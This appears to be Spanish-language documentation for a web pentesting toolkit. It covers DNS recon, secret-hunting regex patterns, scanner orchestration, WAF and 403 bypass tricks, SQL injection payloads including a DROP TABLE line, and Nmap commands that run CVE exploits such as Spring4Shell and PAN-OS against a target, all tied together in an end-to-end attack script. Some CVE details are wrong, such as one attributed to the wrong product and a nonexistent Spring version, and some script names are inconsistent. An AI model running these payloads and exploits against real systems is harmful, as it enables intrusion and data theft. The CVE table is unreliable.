---
title: "Auditoría Automatizada de Vulnerabilidades Web"
skill_id: "web-pentest-automation"
version: "2.0"
created: "2026-07-13"
updated: "2026-07-13"
author: "hackingyseguridad (@antonio_taboada)"
license: "GPL-3.0"
source_repo: "https://github.com/hackingyseguridad/webaudit"
keywords:
  - "pentesting"
  - "web"
  - "vulnerabilidades"
  - "auditoría"
  - "automatización"
  - "WAF bypass"
  - "SQLi"
  - "XSS"
  - "OWASP Top 10"
---

# Auditoría Automatizada de Vulnerabilidades Web

## Descripción General

`webaudit` es una suite integrada de scripts y exploits para automatizar el **descubrimiento, enumeración y detección de vulnerabilidades** en aplicaciones web, APIs REST y servicios HTTP/HTTPS bajo Kali Linux. Implementa fases de pentesting ofensivo (recon → scanning → análisis → explotación) con herramientas como Nmap, Nikto, Wapiti, Sqlmap y exploits CVE nativos en NSE.

**Ámbito:** Auditoría de seguridad ofensiva autorizada en sistemas dentro de tu jurisdicción. Bajo legislación española: Código Penal Art. 197-198; Europea: Directiva 2013/40/UE.

---

## Fases de Operación

### Fase 1: Reconocimiento & Enumeración DNS

**Objetivo:** Identificar activos web (subdominio, servidores, puertos, certificados).

| Script | Función | Herramientas | Entrada |
|--------|---------|--------------|---------|
| **fqdnaudit.sh** | Enumeración DNS masiva, subdominios | `dnsenum`, `fierce`, `dnsrecon`, `dnsmap`, `dig` | Dominio (FQDN) |
| **get.sh** | Extrae headers HTTP/HTTPS, banner | `curl`, `openssl s_client`, `nc` | URL/IP:puerto |
| **metodos.sh** | Enumera métodos HTTP (GET, POST, PUT, DELETE, PATCH) | `curl`, `OPTIONS` | URL |
| **explorarweb.sh** | Rastreo recursivo estructura web | `wget`, `curl`, sitemap parsing | URL base |
| **desgargarweb.sh** | Descarga página completa (mirrors) | `wget -m`, `aria2`, `curl` | URL |

**Ejemplo:**
```bash
# Enumeración completa de dominio
./fqdnaudit.sh -d example.com

# Obtiene headers y certificado SSL/TLS
./get.sh -u https://example.com:443 --cert

# Enumera métodos HTTP permitidos
./metodos.sh -u https://api.example.com/v1/users

# Rastreo web recursivo
./explorarweb.sh -u https://example.com -d 3 -t 10
```

**Hallazgos Típicos (Fase 1):**
- Subdominios no documentados
- Puertos abiertos (8080, 8443, 3000, 5000)
- Banner de servidor (Apache 2.4.x, Nginx 1.18.x, IIS, Node.js)
- Certificados obsoletos (SHA-1, criptografía débil)
- Métodos HTTP peligrosos habilitados (PUT, DELETE sin autenticación)
- Estructura de directorio expuesta (robots.txt, .htaccess, web.config)

---

### Fase 2: Búsqueda de Secretos & Credenciales

**Objetivo:** Localizar credenciales hardcoded, API keys, tokens, ficheros sensibles en el código fuente.

| Script | Función | Patrones | Entrada |
|--------|---------|----------|---------|
| **secretos.sh** | Búsqueda regex de API keys, tokens | AWS, GitHub, Slack, Firebase, Stripe, TWILIO | Directorio o fichero |
| **buscasecretos.sh** | Variante mejorada con filtros | SSH keys, `.pem`, `database.yml`, URLs DB | Directorio |
| **buscasecretosauto.sh** | Automatizado post-descarga web | Todas anteriores + credenciales en comentarios | Directorio descargado |

**Patrones Detectados:**
- **AWS:** `AKIA`, `aws_secret_access_key`, `.aws/credentials`
- **GitHub:** `ghp_`, `gho_`, `ghu_`, `github_token`
- **Slack:** `xoxb-`, `xoxp-`, webhook URLs
- **Firebase:** `firebase_api_key`, `databaseURL`
- **SSH/TLS:** `.pem`, `.key`, `-----BEGIN PRIVATE KEY-----`
- **Database:** Connection strings (MySQL, PostgreSQL, MongoDB), `mongodb://user:pass@host`
- **Hardcoded:** `admin:password`, `root:toor` en comentarios HTML/JS

**Ejemplo:**
```bash
# Descarga completa de sitio
./desgargarweb.sh -u https://example.com -o ./mirror/

# Busca secretos en código descargado
./buscasecretosauto.sh ./mirror/

# Búsqueda manual en directorio específico
./secretos.sh -d ./app/config/ -v

# Con patrón personalizado (GitHub tokens)
./buscasecretos.sh -d ./ -pattern "ghp_[A-Za-z0-9]{36}"
```

**Hallazgos Típicos (Fase 2):**
- AWS credentials en `.env` o `config.json`
- Tokens de Slack en código JavaScript
- URIs de base de datos (PostgreSQL, MongoDB)
- Claves privadas SSH sin protección
- Contraseñas en comentarios de código
- API keys de terceros (Stripe, SendGrid, Twilio)

---

### Fase 3: Análisis Automático & Scanning

**Objetivo:** Ejecución de scanners web especializados para identificar vulnerabilidades OWASP Top 10.

| Script | Herramienta | Vulnerabilidades | Output |
|--------|------------|-------------------|--------|
| **pruebas.sh** | Orquestador multi-scanner | Lanza Nikto, Wapiti, Golismero secuencialmente | HTML, JSON, TXT |
| **httpbasico.sh** | Manual HTTP Basic | Valida respuesta 401/403 | HTML, headers |
| **buscar.sh** | Búsqueda con diccionarios | Fuerza bruta de directorios/ficheros | URL encontradas |
| **qtls.sh** | Análisis TLS/SSL | Ciphers débiles, protocolos deprecated | PNG chart (cifrados.png) |
| **qtls2.sh** | Variante mejorada TLS | HSTS, OCSP stapling, certificate pinning | Report detallado |

**Herramientas Utilizadas:**
- **Nikto:** XSS, LFI, SQL injection, headers inseguros
- **Wapiti:** Path traversal, command injection, XXE
- **Golismero:** Escaneo intenso OWASP (CMS detection)
- **Sslyze:** Análisis certificados, ciphers TLS 1.0-1.3
- **Wafw00f:** Detección WAF (Cloudflare, ModSecurity, F5)

**Ejemplo:**
```bash
# Escaneo completo multi-herramienta
./pruebas.sh -u https://target.com -o ./reportes/

# Análisis TLS/SSL específico
./qtls.sh -d target.com:443

# Búsqueda de directorios comunes
./buscar.sh -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Test HTTP Basic authentication
./httpbasico.sh -u https://admin.target.com -user admin -pass test123
```

**Hallazgos Típicos (Fase 3):**
- XSS reflejado en campos de búsqueda
- SQL injection en parámetros de login
- Local File Inclusion (LFI) en `include=../../../etc/passwd`
- Cross-Site Request Forgery (CSRF) sin tokens válidos
- Headers inseguros (X-Content-Type-Options, CSP débil)
- Servidores proxy abiertos (Open Proxy)
- Directorios listables (.git, .env, /admin/, /backup/)
- Certificados caducados, self-signed, o débiles
- Protocolos TLS <= 1.1, ciphers NULL o DES

---

### Fase 4: Bypass WAF & Análisis 403/404

**Objetivo:** Evitar/detectar controles de seguridad (WAF, firewall web) y códigos HTTP restrictivos.

| Script | Técnica | Payloads | Target |
|--------|---------|----------|--------|
| **wafbypass.sh** | Headers alternativos, encoding | 20+ variantes (X-Original-URL, X-Forwarded-For) | URL protegida |
| **wafbypass2.sh** | Encoding avanzado | Double encoding, unicode, case variation | URL protegida |
| **salta403.sh** | Bypass 403 Forbidden | Path traversal headers, HTTP method override | Ruta 403 |
| **curl403.sh** | Test 30+ combinaciones | Headers custom, diferentes User-Agent | Endpoint 403 |
| **curl404.sh** | Identificación falsos 404 | Content-length analysis, timing attack | Ruta inexistente |
| **curl4xx.sh** | Clustering códigos 4xx | Patrón de respuesta, status code distribution | Diccionario URLs |
| **openproxy.sh** | Detección proxy abierto | HTTP CONNECT, SOCKS5 tunneling | Servidor HTTP |
| **proxy.sh** | Explotación proxy | Solicitudes por proxy abierto | IP objetivo |

**Técnicas de Bypass WAF:**
- **Headers:** `X-Forwarded-For: 127.0.0.1`, `X-Original-URL`, `X-Rewrite-URL`
- **Encoding:** URL encoding, double encoding, %2F vs /, unicode escapes
- **Method Override:** `X-HTTP-Method-Override: POST` en GET
- **Case Variation:** `/Admin`, `/ADMIN`, `/AdMiN`
- **HTTP Version:** HTTP/0.9, HTTP/1.1 vs HTTP/2
- **Protocol Smuggling:** HTTP/2 request splitting

**Ejemplo:**
```bash
# Bypass WAF completo (Cloudflare, ModSecurity)
./wafbypass.sh -u https://protected.example.com -v

# Test 403 bypass específico
./salta403.sh -u https://example.com/admin -method GET

# Detecta si es true 404 o falso
./curl404.sh -u https://example.com -d /usr/share/wordlists/dirb/big.txt

# Detecta proxy abierto
./openproxy.sh -t example.com:3128

# Bypass con encoding especial
./wafbypass2.sh -u https://example.com/api/users --encoding double-url
```

**Hallazgos Típicos (Fase 4):**
- WAF Cloudflare bypassable con `X-Forwarded-For: 127.0.0.1`
- 403 Forbidden saltable con path traversal: `/../../admin/`
- Falsos 404 que responden con contenido (204 vs 200)
- Proxy HTTP abierto en puerto 3128 o 8080
- HTTP method override: PUT/DELETE permitidos vía POST + header
- Rate limiting débil en endpoint protegido

---

### Fase 5: Inyección SQL & Explotación de Base Datos

**Objetivo:** Detectar y explotar vulnerabilidades de SQL injection.

| Script | Método | Tipos SQLi | Salida |
|--------|--------|-----------|--------|
| **sqli.sh** | Manual paso a paso | Boolean-based, Time-based, Error-based, Union | Datos extraídos |
| **sqliauto.sh** | Automatizado (sqlmap wrapper) | Todos + Stacked queries, Second-order | Credenciales, tablas, BBDDs |

**Tipos de SQL Injection Detectados:**
1. **Error-based:** Mensaje de error en respuesta (ej: `Uncaught exception`)
2. **Boolean-based:** Diferencias en contenido (`true` vs `false`)
3. **Time-based:** `SLEEP()`, `BENCHMARK()` → respuesta lenta
4. **Union-based:** Concatena resultados con SELECT legítimo
5. **Stacked Queries:** Múltiples sentencias SQL separadas `;`
6. **Blind SQL Injection:** Sin feedback directo, inferencia por timing/content

**Payloads Clásicos:**
```sql
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL, NULL, NULL--
'; DROP TABLE users;--
' AND SLEEP(5)--
' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--
```

**Ejemplo:**
```bash
# Test manual SQLi con payloads clásicos
./sqli.sh -u "https://example.com/search.php?id=" -type GET -v

# Automatizado: extrae bases de datos
./sqliauto.sh -u "https://example.com/login" -d "user=admin&pass=test" -type POST

# Extrae tabla específica
./sqliauto.sh -u "https://example.com/products.php?id=1" \
              -type GET --batch --database-name webshop --table users

# Con cookies de sesión
./sqliauto.sh -u "https://example.com/profile" --cookies "PHPSESSID=abc123" --dump
```

**Hallazgos Típicos (Fase 5):**
- Parámetro `id=1 AND 1=2` devuelve 0 resultados (Boolean-based)
- `id=1' OR 'a'='a` retorna todos los registros (Error-based)
- `id=1 UNION SELECT username,password FROM users` extrae credenciales
- Tabla `users` con 50,000 contraseñas en plaintext
- Base de datos MySQL 5.6 (versión desactualizada, múltiples CVEs)
- Privilege escalation: usuario BBDD es `root` sin password

---

### Fase 6: Exploits CVE & Explotación

**Objetivo:** Ejecutar exploits contra vulnerabilidades conocidas (CVE).

| NSE/Script | CVE | Componente | CVSS | Descripción |
|-----------|-----|-----------|------|-------------|
| **CVE-2019-19781.nse** | CVE-2019-19781 | Citrix NetScaler | 9.8 | RCE pre-auth via path traversal |
| **CVE-2021-41773.nse** | CVE-2021-41773 | Apache HTTP 2.4.49-2.4.50 | 7.5 | Path Traversal + RCE |
| **CVE-2022-22965.nse** | CVE-2022-22965 | Spring Framework 9.0.x | 9.8 | RCE (Spring4Shell) |
| **CVE-2022-31813.sh** | CVE-2022-31813 | Apache mod_proxy | 8.6 | Bypass y Request Smuggling |
| **CVE-2022-39952.nse** | CVE-2022-39952 | Cacti 1.2.x | 9.8 | SQL Injection RCE |
| **CVE-2023-20198.nse** | CVE-2023-20198 | Cisco IOS XE | 10.0 | RCE remoto |
| **CVE-2023-27350.nse** | CVE-2023-27350 | Cacti 1.2.18 | 9.8 | RCE |
| **CVE-2024-3400.nse** | CVE-2024-3400 | PAN-OS | 10.0 | Authentication Bypass + RCE |
| **traversal.nse** | Multiple | Múltiples | Var. | Path Traversal genérico |

**Integración con Nmap:**
```bash
# Copia exploits NSE al directorio de Nmap
sudo cp *.nse /usr/share/nmap/scripts/

# Recarga base de datos
nmap --script-updatedb

# Ejecuta exploit contra host objetivo
nmap -p 443 --script CVE-2022-22965.nse target.com

# Escaneo completo con todos los CVE
nmap -p- --script "CVE-*.nse" -Pn target.com
```

**Ejemplo de Explotación:**
```bash
# Test Spring4Shell (CVE-2022-22965)
nmap -p 8080 --script CVE-2022-22965.nse \
     --script-args "target.url=http://target.com:8080/poc" target.com

# Detecta Citrix NetScaler vulnerable
nmap -p 443 --script CVE-2019-19781.nse --script-args "rhost=target.com" target.com

# Test PAN-OS RCE
nmap -p 443 --script CVE-2024-3400.nse target.com
```

**Mitigaciones Típicas:**
- Parches disponibles de vendor (Microsoft, Apache, Cisco)
- WAF rules para bloquear payloads (ModSecurity OWASP CRS)
- Deshabilitar módulos innecesarios (mod_proxy, WebDAV)
- Restringir métodos HTTP a GET/POST solamente
- Implementar validación de entrada estricta

---

## Tabla de Decisión: Selección de Script por Vulnerabilidad

| Vulnerabilidad OWASP | Script | Prioridad | Tiempo |
|----------------------|--------|-----------|--------|
| **A01: Broken Access Control** | `salta403.sh`, `curl403.sh` | 🔴 CRÍTICA | 5-10 min |
| **A02: Cryptographic Failures** | `qtls.sh`, `qtls2.sh` | 🔴 CRÍTICA | 2-5 min |
| **A03: Injection (SQL, OS)** | `sqli.sh`, `sqliauto.sh` | 🔴 CRÍTICA | 15-30 min |
| **A04: Insecure Design** | `pruebas.sh` (Nikto+Wapiti) | 🟠 ALTA | 20-40 min |
| **A05: Security Misconfiguration** | `buscar.sh`, `get.sh` | 🟠 ALTA | 10-20 min |
| **A06: Vulnerable & Outdated** | NSE scripts (CVE-*.nse) | 🔴 CRÍTICA | 5-15 min |
| **A07: Authentication Failures** | `httpauthbasic.sh`, `httpauthcod.sh` | 🔴 CRÍTICA | 10-20 min |
| **A08: Data Integrity Failures** | `metodos.sh` (PUT/DELETE) | 🟠 ALTA | 5 min |
| **A09: Logging & Monitoring** | `fqdnaudit.sh` | 🟡 MEDIA | 10-15 min |
| **A10: SSRF** | `openproxy.sh`, `proxy.sh` | 🟠 ALTA | 10-15 min |

---

## Workflow Completo: Auditoría End-to-End

```bash
#!/bin/bash
# webaudit_full_workflow.sh - Auditoría completa automatizada

TARGET="https://target.com"
OUTPUT_DIR="./audits/$(date +%Y%m%d_%H%M%S)"

echo "[*] Iniciando auditoría de $TARGET"
mkdir -p "$OUTPUT_DIR"

# Fase 1: Reconocimiento
echo "[1/6] Reconocimiento & Enumeración..."
./fqdnaudit.sh -d $(echo $TARGET | sed 's|https://||') > "$OUTPUT_DIR/01_dns_enum.txt"
./get.sh -u "$TARGET" --cert > "$OUTPUT_DIR/02_headers.txt"
./metodos.sh -u "$TARGET" > "$OUTPUT_DIR/03_methods.txt"

# Fase 2: Búsqueda de secretos
echo "[2/6] Descargando y buscando secretos..."
./desgargarweb.sh -u "$TARGET" -o "$OUTPUT_DIR/mirror/"
./buscasecretosauto.sh "$OUTPUT_DIR/mirror/" > "$OUTPUT_DIR/04_secrets.txt"

# Fase 3: Análisis automático
echo "[3/6] Escaneo multi-herramienta..."
./pruebas.sh -u "$TARGET" -o "$OUTPUT_DIR/05_scanners/"

# Fase 4: WAF bypass
echo "[4/6] Testing WAF & bypass 403/404..."
./wafbypass.sh -u "$TARGET" -o "$OUTPUT_DIR/06_waf_bypass.txt"
./salta403.sh -u "$TARGET" > "$OUTPUT_DIR/07_403_analysis.txt"

# Fase 5: SQLi
echo "[5/6] Testing SQL Injection..."
./sqliauto.sh -u "$TARGET" --batch > "$OUTPUT_DIR/08_sqli.txt" 2>&1

# Fase 6: CVE exploits
echo "[6/6] Ejecutando exploits NSE..."
nmap -p 443 --script "CVE-*.nse" -Pn "$TARGET" > "$OUTPUT_DIR/09_cve_exploits.txt"

echo "[✓] Auditoría completada en: $OUTPUT_DIR"
```

---

## Referencias OWASP Top 10 2021

| Vulnerabilidad | Enlace OWASP | Impacto |
|----------------|--------------|--------|
| Broken Access Control | [A01:2021](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) | Acceso a datos/funciones no autorizadas |
| Cryptographic Failures | [A02:2021](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) | Exposición de datos sensibles |
| Injection | [A03:2021](https://owasp.org/Top10/A03_2021-Injection/) | RCE, acceso BBDD, XSS |
| Insecure Design | [A04:2021](https://owasp.org/Top10/A04_2021-Insecure_Design/) | Controles de seguridad débiles |
| Security Misconfiguration | [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) | Acceso no autorizado |
| Vulnerable & Outdated | [A06:2021](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) | RCE, escalada de privilegios |
| Authentication Failures | [A07:2021](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) | Account takeover |
| Data Integrity Failures | [A08:2021](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) | Corrupción de datos |
| Logging & Monitoring | [A09:2021](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/) | Detección evasión |
| SSRF | [A10:2021](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) | Acceso a servidores internos |

---

## Requisitos & Instalación

### Dependencias del Sistema

```bash
# Actualización previa
sudo apt update && sudo apt upgrade -y

# Instalación de herramientas principales
sudo apt install -y \
  nmap nikto wapiti golismero wafw00f sslyze theharvester \
  curl wget dmitry dnsenum dnsmap dnsrecon fierce dnswalk \
  uniscan xsser davtest sqlmap lbd whatweb whois aria2 netcat

# NSE scripts para Nmap
sudo cp *.nse /usr/share/nmap/scripts/
nmap --script-updatedb
```

### Instalación Rápida

```bash
git clone https://github.com/hackingyseguridad/webaudit.git
cd webaudit
chmod +x *.sh
sudo bash instalar.sh

# Verificación
for tool in nmap nikto wapiti wafw00f; do
  command -v "$tool" &>/dev/null && echo "✓ $tool" || echo "✗ $tool"
done
```

---

## Disclaimers Legales & Responsabilidad

⚠️ **USO ÚNICAMENTE AUTORIZADO:** Este toolkit está diseñado **exclusivamente para auditoría de seguridad autorizada** en sistemas que poseas o tengas permiso escrito del propietario. 

**Jurisdicciones:**
- 🇪🇸 **España:** Código Penal Español Art. 197-198 (acceso no autorizado), Art. 264 (daño a bienes).
- 🇪🇺 **UE:** Directiva 2013/40/UE sobre ataques a sistemas de información.
- 🇺🇸 **USA:** CFAA (Computer Fraud and Abuse Act) 18 USC §1030.

**Responsabilidades del Usuario:**
1. ✅ Obtener **consentimiento escrito** del propietario/administrador.
2. ✅ Cumplir **leyes locales** de acceso a sistemas.
3. ✅ Mantener **confidencialidad** de datos sensibles descubiertos.
4. ✅ Reportar hallazgos de forma **responsable** (disclosure coordinado).
5. ❌ No usar contra terceros sin autorización.
6. ❌ No acceder a datos personales más allá del scope.

**El autor (hackingyseguridad.com) no se responsabiliza de:**
- Uso malintencionado del toolkit
- Daños legales o económicos derivados
- Pérdida de datos por mal uso
- Violación de leyes aplicables

---

## Mejores Prácticas

1. **Siempre obtener autorización escrita** antes de cualquier pentest.
2. **Documentar todos los hallazgos** con timestamps y evidencias.
3. **Usar VPN/proxy anónimo** para ocultar IP origen (con permisos).
4. **Limitar scope** a activos acordados con cliente.
5. **Reportar vulnerabilidades críticas** inmediatamente.
6. **Seguir coordinated disclosure:** 90 días al vendor antes de publicación.
7. **Usar entorno sandbox** para testing de exploits riesgosos.
8. **Mantener logs auditables** de todas las acciones.

---

## Referencias & Recursos

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [HackerOne Vulnerability Classification](https://www.hackerone.com/)
- [Exploits NSE Nmap](https://svn.nmap.org/nmap/scripts/)
- [Repositorio oficial](https://github.com/hackingyseguridad/webaudit)

---

**Creado por:** [@antonio_taboada](https://x.com/antonio_taboada) | hackingyseguridad.com  
**Licencia:** GPL-3.0  
**Última actualización:** 2026-07-13
